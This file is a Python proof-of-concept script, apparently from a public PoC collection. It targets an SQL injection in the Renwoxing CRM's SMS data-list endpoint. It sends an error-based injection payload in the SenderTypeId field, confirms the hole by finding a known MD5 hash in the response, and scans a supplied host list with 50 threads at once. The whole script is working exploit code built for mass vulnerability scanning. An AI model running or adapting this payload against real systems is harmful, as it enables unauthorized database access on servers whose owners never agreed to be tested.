#!/usr/bin/python3
# -*- coding:utf-8 -*-
# author:MDSEC
# from:https://github.com/MD-SEC/MDPOCS
# "app="任我行CRM"

import sys
import requests
import csv
import urllib3
import hashlib
from concurrent.futures import ThreadPoolExecutor

if len(sys.argv) != 2:
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ DES: by MDSEC as https://github.com/MD-SEC/MDPOCS                                                        +')
    print(
        '+-------------------------------------------------------------------------------------------------- -------+')
    print(
        '+ USE: python3 <filename> <hosts.txt>                                                                       +')
    print(
        '+ EXP: python3 Renwoxing_CRM_Typeid_sql_Poc.py url.txt                                                  +')
    print(
        '+-------------------------------------------------------------------------------------------------- --------+')
    sys.exit()
proxysdata = {
'http': '127.0.0.1:8080'
} 
def poc(host):
    if "http" in host:
        url = host
    else:
        url ="http://"+host
    host1=url.replace("http://","")
    host2=host1.replace("https://","")
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 Chrome/83.0.4103.116 Safari/537.36",
        "Accept-Encoding":"gzip, deflate",
        "Accept": "*/*",
        "Connection":"close",
        "Content-Type":"application/x-www-form-urlencoded",
        "Content-Length":"89",
        "Host":"%s" % host2

    }
    vulurl = url + "/SMS/SmsDataList/?pageIndex=1&pageSize=30"
    data="Keywords=&StartSendDate=2020-06-17&EndSendDate=2020-09-17&SenderTypeId=0000000000'and 1=convert(int,(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123456')))) AND 'CvNI'='CvNI"
    try:
        r = requests.post(vulurl, headers=headers,data=data)
        # print(r.content)
        
        if r.status_code==200 and "0xe10adc3949ba59abbe56e057f20f883e" in str(r.content): 
            print(host+" : true ")
            #print(r.text)
        else:
            return 0
    except:
        return 0


if __name__ == '__main__':
    file = sys.argv[1]
    data = open(file)
    reader = csv.reader(data)
    with ThreadPoolExecutor(50) as pool:
        for row in reader:
            pool.submit(poc, row[0])